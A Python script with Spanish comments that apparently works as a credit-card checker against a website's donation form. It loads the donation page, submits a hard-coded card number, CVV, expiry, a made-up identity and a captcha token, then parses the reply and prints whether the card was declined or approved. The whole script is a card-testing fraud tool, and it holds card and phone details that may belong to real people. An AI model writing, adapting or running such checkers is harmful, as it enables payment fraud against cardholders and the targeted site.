import requests

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def main():
    session = requests.Session()

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'es-ES,es;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = session.get('https://freerepublic.com/donate/', headers=headers).text

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'es-ES,es;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Referer': 'https://freerepublic.com/donate/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = session.get('https://freerepublic.com/donate/0975b66V3CGafKnI8iiyI15p9ihUvks2UwzElY/pay-by-card', headers=headers).text

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'es-ES,es;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://freerepublic.com',
        'Referer': 'https://freerepublic.com/donate/0975b66V3CGafKnI8iiyI15p9ihUvks2UwzElY/pay-by-card',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'foreign': '0',
        'number': '4266841804356051',
        'cvv2': '170',
        'month': '05',
        'year': '2030',
        'first_name': 'Oklahoma',
        'last_name': 'Evan Hicks',
        'address': 'Eason Rd 5460',
        'city': 'Phoenix',
        'state': 'us',
        'zip': '55573',
        'email': 'example@gmail.com',
        'phone': '9497674837',
        'country': 'usa',
        'g-recaptcha-response': '0cAFcWeA7KHl6TECxAdM7lrQFGtNB-f7p-vptyOsNUpFWiTBw6ObgbSGKu3QUoT6PZ0qrJj4GeIx9yPw1Ou1-yW7Gz1lKGHkHFMvGXx8uWWMwIcZXtvBA0BIXM_V2LLo_EwiG6aSac3mts5MVO7gX6KPMAS_GNAA4xEMghC0FoHIHGU1Z_qLhzyYa7L5YHqVJbE3oQAGduxZbrAqwa22jZpzdm08rjvE4Mj4X9YZvINAUkfmmHdTbR_p94WDWMDol5Tp1qtKQgnVzoC0DeZnsfWTJrM-LDjxt9P_ARX6Lw4lj4rKtYUj2wFn3KisxCHJrHb4zJSPFAN3D5RPKpw8a8oju7XFDp8cyeTcbuemB-vxN898-t5ssn5W1e6C9LzVJu7BdnbC4DDEMTb2CkRb1kGgYDZ6nF4BNpfbx2tJc0HeEm4Pryv75YL3gt7MUK4nBHaY2PGMB4S5APXEdl04Lagfr14veP3TqXjigpMicGVm1XWpO--ph_7R7xtRXdZhL_VH0Cp2BIbrqsDJvtZ5iX_eAnmUp-bBMjPoPLZsoCGsjvBsiOxkDJwCp3FE8CFxk2brmjGCCs_Xhk39GRjLqm67jT_NowVgWrtr-9l1UAHEiG7ytbpeMg9DfxvTAMk59F-anOMInsrsgDd0MJ3mPSXxE5v0NyQBr6T04FZz0-uDr3jEhalpzPv0EGlwLBYV4q6A5eNFQi8GjPIW6xby0r-vYebR_B06vCIRjk1GXEzRu8S6b5oelh4ojCF2VN-Z9aWCfTnDYyo7oOlwKhupapChuPqQGAg3frHM2AyB7U7JX00td9DhzbDNVMw79YwjGBtXRJYS48a7zbmOEmWFpjG701Q5xRW2gjwhBTBV9N_mt1fWs8QCiXrh_3Nozptmc-_hR75NWl66R250FLekYSrEirajxfAsaHiw6oUutb9rBgHvlW2OGuv_tFXxcmkRnp8Ylv8zM8iHQsLupt_KGe5M0PEnBA03RM0VFxodMXs1j3r6M8tOlGlabzVmTBuQkRqOEDkT7LszqabOUZFzbrP9na-AAGmUyRVVpDVCEw2DhmQywJnFUvD-5YxA1_waYBsRfYpoP2gyxnMXLUHIe9lfoVz1MOPVDcZtbHXrL8BNDh-GmTBfBrUIM1XWrqAItAnU8Z6LtYuLV67AgzkEefKJIXpvldaM2d2U3B2JzKniiYSYpB9WypOiLURW6Z-pPWlZZSImjuKS8c64QkqcyHJkY9WficbcIlkNSSv3byht1WAoiE379kYAbrgZrUL3QcDC70jr-lWdRU8yajGIhmDO-ZhTEnQNl3J2K-LbpvgK9NpfwGEbsXxgf7HxxJTlr_m5C2o87RsS1XQ_irO0MwqRdVjiWGwj0Q31GnfirkRWbnv40-oWxBFBYj5lQasRXgli9Q5eeK-Rjf8n_7jqY5DZd4A4GVbEaLbtmjcdbvsMOcgY1PFdGrieCxr82TlkGjFerdKGPkx7_LlFnG6CKdmVw7R8N4PQP0IKX2MNf3-kZCJGbaBCWbWIIsODa2hgkkZLEBk740se-diSn-vCVNkMMzLg0iCQFkxHf9h-AU8itl3j2d6FSVaDMksXUOkZz_CHnl55vvabMgRvNqa773V5J632_VStJottRbMaHX4yRsyzrRnJShtxhAiFuzhjs_RxO85_UDcTJxdD_t-XtidATgCbLI4zmZFGhDpnjj2tULM0z1j8smmMFgRO7jFPCI2iTXeZ96_VE2j9xFUXSnC0sl69IYhCEpaH7mCoYVBLYNQKnWyo60bKotz1bkDS27WBmPT1b6uBPxUFOTS3kys1fWtdGnLBZKgqiO30rZisSS4rtLkZPM3ZFyKTsKBOYqkayLlJqZ7a4oYFNhkB2tNs87Z-uKwjYnwxG5kik4zeJGia2YbTYJtFsnHcCmEDpIzkTfdrynh7uRU6VAq2FVkT6nBuGU83Sl2M5Biw3mDY2QBBcvR9Jv-rz63xOLfGxpKsHCjXpsjYpXpBfMSTJ2BIpiTMNMMJhOUqw067fBYKaGKrR84rm7XYlJJ6u6SfzzO8-FdVST41lF2I_-uxGH30ceNDKqB3NWPd04FPeRJPHqj3Q1vFL2AFdf_GA1kSqnohxWsdNdUqnELXrFEOCT0SCgh7HOsUvToQ',
    }

    response = session.post(
        'https://freerepublic.com/donate/0975b66V3CGafKnI8iiyI15p9ihUvks2UwzElY/pay-by-card',
        headers=headers,
        data=data,
    ).text

    # ---- EXTRACCIÓN DE DATOS (sin modificar nada arriba) ----
    # Número de tarjeta
    card_number = parseX(response, 'id="card_number_text" name="number"  size="20"  value="', '"')
    # Código de seguridad
    cvv = parseX(response, '<input type="text" id="card_cvv2_text" name="cvv2"  size="3"  value=', '" />')
    
    # Fecha: buscar mes y año seleccionados en los <select>
    import re
    month_match = re.search(r'<select id="card_month_select"[^>]*>.*?<option value="(\d+)" selected="selected">', response, re.DOTALL)
    year_match = re.search(r'<select id="card_year_select"[^>]*>.*?<option value="(\d+)" selected="selected">', response, re.DOTALL)
    month = month_match.group(1) if month_match else "?"
    year = year_match.group(1) if year_match else "?"
    expiration = f"{month}/{year}"
    
    # Determinar si fue declinada o aprobada
    if "The card was declined" in response:
        status = "DECLINADA"
        # Extraer solo el mensaje de declinación (sin la línea de "An error occurred...")
        error_match = re.search(r'The card was declined\.[^<]+', response)
        error_msg = error_match.group(0).strip() if error_match else "No se encontró mensaje"
    elif "approved" in response.lower() or "success" in response.lower():
        status = "APROBADA"
        error_msg = ""
    else:
        status = "DESCONOCIDO"
        error_msg = "Revisar respuesta completa"
    
    # Mostrar SOLO lo pedido
    print("\n" + "="*40)
    print(f"Tarjeta: {card_number}")
    print(f"Fecha: {expiration}")
    print(f"CVV: {cvv}")
    print(f"Estado: {status}")
    if status == "DECLINADA":
        print(f"Error: {error_msg}")
    print("="*40)
    
    # Si quieres seguir imprimiendo todo el HTML como antes, descomenta la siguiente línea:
    # print(response)

main()